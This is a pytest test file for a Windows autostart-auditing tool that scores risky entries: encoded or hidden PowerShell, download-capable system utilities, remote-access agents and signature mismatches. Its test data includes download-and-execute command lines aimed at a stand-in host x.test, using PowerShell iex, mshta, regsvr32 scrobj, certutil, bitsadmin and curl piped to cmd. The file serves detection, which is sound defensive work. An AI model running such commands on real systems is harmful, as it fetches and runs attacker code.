import ntpath
import sys
from datetime import datetime, timedelta
from pathlib import Path
from types import SimpleNamespace

import pytest

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT / "src"))

from winaudit import api, risk
from winaudit.scanners import AutostartEntry, ScanReport

POWERSHELL = r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"'
MICROSOFT = "CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"
GOOGLE = "CN=Google LLC, O=Google LLC, L=Mountain View, S=California, C=US"
UNTRUSTED_ROOT_MESSAGE = (
    "A certificate chain processed, but terminated in a root certificate "
    "which is not trusted by the trust provider."
)


def make_entry(command, name="Item", source="Registry Run Key"):
    return AutostartEntry(
        source=source, name=name, command=command,
        location="HKCU\\Software\\Run", scope="current user",
        created=datetime.now() - timedelta(days=90),
    )


# ---- has_suspicious_lolbin_command ------------------------------------

@pytest.mark.parametrize("option", [
    "-e", "-ec", "-en", "-enc", "-enco", "-EncodedCommand", "-ENCODEDCOMMAND", "/enc",
])
def test_every_way_of_writing_encoded_command_is_caught(option):
    assert risk.has_suspicious_lolbin_command(f"{POWERSHELL} {option} VGVzdA==")


def test_encoded_command_option_without_a_value_is_still_caught():
    assert risk.has_suspicious_lolbin_command(f"{POWERSHELL} -NoProfile -enc")


def test_unquoted_program_path_with_spaces_is_handled():
    command = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -e VGVzdA=="

    assert risk.has_suspicious_lolbin_command(command)


@pytest.mark.parametrize("arguments", [
    "-w hidden -File x.ps1", "-windowstyle hidden -File x.ps1",
    "-win h -File x.ps1", "-w 1 -File x.ps1",
    "-ep bypass -File x.ps1", "-executionpolicy bypass -File x.ps1",
    "-exec unrestricted -File x.ps1",
    '-c "iex (New-Object Net.WebClient).DownloadString(\'http://x.test/a\')"',
    "-c iex(Invoke-WebRequest http://x.test/a)",
])
def test_hidden_bypassing_or_downloading_powershell_is_caught(arguments):
    assert risk.has_suspicious_lolbin_command(f"{POWERSHELL} {arguments}")


@pytest.mark.parametrize("arguments", [
    '-File "C:\\Scripts\\maintenance.ps1"',
    "-NoProfile -File x.ps1",
    "-w normal -File x.ps1",
    "-ex AllSigned -File x.ps1",
    "-ep restricted -File x.ps1",
    '-Command "Get-Date"',
])
def test_ordinary_powershell_is_not_flagged(arguments):
    assert not risk.has_suspicious_lolbin_command(f"{POWERSHELL} {arguments}")


@pytest.mark.parametrize("command", [
    r"C:\Windows\System32\mshta.exe javascript:a=GetObject('script:http://x.test/a')",
    r"C:\Windows\System32\regsvr32.exe /s /n /u /i:http://x.test/a.sct scrobj.dll",
    r"C:\Windows\System32\certutil.exe -urlcache -f http://x.test/a.exe a.exe",
    r"C:\Windows\System32\bitsadmin.exe /transfer job http://x.test/a.exe C:\a.exe",
    r"C:\Windows\System32\cmd.exe /c curl http://x.test/a | cmd",
])
def test_other_dual_use_utilities_with_download_arguments_are_caught(command):
    assert risk.has_suspicious_lolbin_command(command)


@pytest.mark.parametrize("command", [
    r'C:\WINDOWS\system32\cmd.exe /q /c del /q "C:\Users\x\AppData\Local\Microsoft\OneDrive\Setup.exe"',
    r"C:\Windows\System32\certutil.exe -hashfile C:\a.exe SHA256",
    r"C:\Windows\System32\rundll32.exe C:\Windows\System32\PcaSvc.dll,PcaPatchSdbTask",
    r'"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start',
    r"C:\Apps\app.exe -enc VGVzdA==",  # not a dual-use utility
    "",
])
def test_ordinary_commands_are_not_flagged(command):
    assert not risk.has_suspicious_lolbin_command(command)


# ---- assess: rules that apply without any baseline ---------------------

def test_suspicious_powershell_is_scored_without_a_baseline():
    result = risk.assess(make_entry(f"{POWERSHELL} -NoProfile -w hidden -e VGVzdA=="))

    assert result.score == 4
    assert "Uses a dual-use utility with suspicious command arguments" in result.reasons


def test_remote_access_tools_are_pointed_out():
    entry = make_entry(
        r'"C:\Program Files (x86)\ScreenConnect Client (abc123)\ScreenConnect.ClientService.exe" "?e=Access"'
    )

    result = risk.assess(entry)

    assert result.score == 2
    assert any("remote-access or remote-management tool" in reason for reason in result.reasons)


def test_remote_access_tool_is_recognised_from_the_service_name_too():
    result = risk.assess(make_entry(r"C:\Tools\agent.exe", name="MeshAgent"))

    assert result.score == 2


@pytest.fixture
def file_exists(monkeypatch):
    monkeypatch.setattr(risk.os.path, "exists", lambda path: True)


def checker(status, publisher=None, message=""):
    return lambda path: {
        "status": status, "publisher": publisher, "status_message": message,
        "checked": True, "signed": status == "Valid",
    }


MICROSOFT_FOLDER_COMMAND = r'"C:\Program Files\Microsoft Corporation\Tool\tool.exe"'
OTHER_FOLDER_COMMAND = r'"C:\Program Files\Other Vendor\tool.exe"'


def test_unsigned_file_in_a_microsoft_named_folder_is_flagged(file_exists):
    result = risk.assess(make_entry(MICROSOFT_FOLDER_COMMAND), signature_checker=checker("NotSigned"))

    assert result.score == 5  # 2 for unsigned, 3 for the folder
    assert "Located in a folder named after Microsoft, but not signed by Microsoft" in result.reasons


def test_file_signed_by_someone_else_in_a_microsoft_named_folder_is_flagged(file_exists):
    result = risk.assess(make_entry(MICROSOFT_FOLDER_COMMAND), signature_checker=checker("Valid", GOOGLE))

    assert result.score == 3


def test_file_really_signed_by_microsoft_in_a_microsoft_folder_is_fine(file_exists):
    result = risk.assess(make_entry(MICROSOFT_FOLDER_COMMAND), signature_checker=checker("Valid", MICROSOFT))

    assert result.score == 0


def test_inconclusive_signature_check_does_not_trigger_the_folder_rule(file_exists):
    result = risk.assess(make_entry(MICROSOFT_FOLDER_COMMAND), signature_checker=checker("UnknownError"))

    assert result.score == 1  # only the "could not be verified" point


def test_unsigned_file_in_an_ordinary_folder_gets_no_folder_point(file_exists):
    result = risk.assess(make_entry(OTHER_FOLDER_COMMAND), signature_checker=checker("NotSigned"))

    assert result.score == 2


# ---- "never seen by VirusTotal" (applied during the scan) --------------

def scan_one(monkeypatch, entry, signature, virustotal_result):
    scanner = SimpleNamespace(scan=lambda: ScanReport(scanner=entry.source, entries=[entry]))
    path = risk.extract_exe_path(entry.command)

    monkeypatch.setattr(api, "SCANNERS", [scanner])
    monkeypatch.setattr(api.signature, "batch_check", lambda paths: {path: signature})
    monkeypatch.setattr(api.os.path, "exists", lambda p: True)
    monkeypatch.setattr(
        api.virustotal, "check_file", lambda p, allow_network=True: virustotal_result
    )
    results, _ = api.perform_scan()
    return results[0]


UNKNOWN_TO_VT = {"found": False, "malicious_count": 0, "total_engines": 0,
                 "from_cache": False, "stale": False, "network_call": True}


def test_unknown_unsigned_file_gets_the_never_seen_point(monkeypatch):
    signature = {"status": "NotSigned", "publisher": None, "checked": True, "signed": False}

    result = scan_one(monkeypatch, make_entry(OTHER_FOLDER_COMMAND), signature, UNKNOWN_TO_VT)

    assert result["score"] == 4  # 2 unsigned + 2 never seen
    assert any(reason.startswith("Never seen by VirusTotal") for reason in result["reasons"])


def test_unknown_but_validly_signed_file_does_not(monkeypatch):
    signature = {"status": "Valid", "publisher": GOOGLE, "checked": True, "signed": True}

    result = scan_one(monkeypatch, make_entry(OTHER_FOLDER_COMMAND), signature, UNKNOWN_TO_VT)

    assert result["score"] == 0


def test_deferred_lookup_is_not_treated_as_never_seen(monkeypatch):
    signature = {"status": "NotSigned", "publisher": None, "checked": True, "signed": False}
    deferred = {"deferred": True, "network_call": False, "from_cache": False}

    result = scan_one(monkeypatch, make_entry(OTHER_FOLDER_COMMAND), signature, deferred)

    assert result["score"] == 2


# ---- regression: a real remote-access agent posing as a Windows service -

def test_remote_access_agent_posing_as_a_windows_component_is_flagged_by_every_rule(monkeypatch):
    """Modelled on a malicious service found by Windows Defender during live
    testing of this tool. Only the scan data is reproduced here (command line,
    signer and results), never the file itself; names are sanitised."""
    entry = make_entry(
        r'"C:\Program Files\Microsoft Corporation\AggregatorHost\AggregatorHost.exe" '
        r'--meshServiceName="AggregatorHost"',
        name="AggregatorHost",
        source="Windows Service",
    )
    signature = {
        "status": "UnknownError",
        "status_message": UNTRUSTED_ROOT_MESSAGE,
        "publisher": "CN=server.example-hosting.test-ab12cd",
        "checked": True,
        "signed": False,
    }

    result = scan_one(monkeypatch, entry, signature, UNKNOWN_TO_VT)

    assert "Signature certificate chain terminates at an untrusted root certificate" in result["reasons"]
    assert "Located in a folder named after Microsoft, but not signed by Microsoft" in result["reasons"]
    assert any("remote-access or remote-management tool" in reason for reason in result["reasons"])
    assert any(reason.startswith("Never seen by VirusTotal") for reason in result["reasons"])
    assert result["score"] == 11  # 4 + 3 + 2 + 2
